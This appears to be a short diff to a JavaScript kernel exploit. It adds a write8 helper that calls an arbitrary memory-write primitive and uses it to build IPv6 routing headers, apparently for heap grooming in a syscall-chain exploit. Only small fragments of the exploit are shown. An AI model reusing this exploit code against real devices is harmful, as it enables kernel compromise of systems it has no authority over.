@@ -205,6 +205,10 @@ let victimWpipeFd = 0;
 
 let previousCore = -1;
 
+Buffer.prototype.write8 = function(offset, value) {
+    mem.write8(this.addr + offset, value);
+};
+
 function sys_void(...args) {
   return chain.syscall_void(...args);
 }
@@ -415,10 +419,11 @@ function cleanup() {
 function buildRthdr(buf, size) {
     let len = ((size >> 3) - 1) & ~1;
 
-    buf.putByte(0x00, 0);                 // ip6r_nxt
-    buf.putByte(0x01, len);               // ip6r_len
-    buf.putByte(0x02, IPV6_RTHDR_TYPE_0); // ip6r_type
-    buf.putByte(0x03, len >> 1);          // ip6r_segleft
+
+    buf.write8(0x00, 0);                // ip6r_nxt
+    buf.write8(0x01, len);              // ip6r_len
+   buf.write8(0x02, IPV6_RTHDR_TYPE_0);// ip6r_type
+   buf.write8(0x03, len >> 1);         // segments_left
 
     return (len + 1) << 3;
 }
@@ -1370,6 +1375,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
